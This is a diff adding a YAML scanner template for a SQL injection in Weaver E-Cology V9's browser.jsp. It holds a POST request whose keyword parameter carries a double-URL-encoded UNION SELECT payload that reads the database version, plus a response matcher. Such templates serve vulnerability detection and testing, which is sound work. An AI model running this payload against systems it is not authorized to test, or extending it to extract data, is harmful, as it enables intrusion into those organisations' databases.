@@ -1,0 +1,24 @@
+id: E-Cology V9 SQL注入漏洞
+
+
+info:
+  name: E-Cology browser.jsp V9- SQL Injection
+  author: hhhnee
+  severity: high
+  verified: true
+  description: |
+    泛微OA E-Cology V9 browser.jsp SQL注入漏洞，攻击者可以通过browser.jsp文件中的keyword参数进行注入。
+  reference:
+    - https://github.com/7estUser/WIKI-POC/blob/main/Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/E-Cology%20V9%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /mobile/%20/plugin/browser.jsp
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        isDis=1&browserTypeId=269&keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537
+    expression: response.status == 200 && (response.body.bcontains(b'SQL Server')||response.body.bcontains(b'Enterprise'))
+expression: r0()
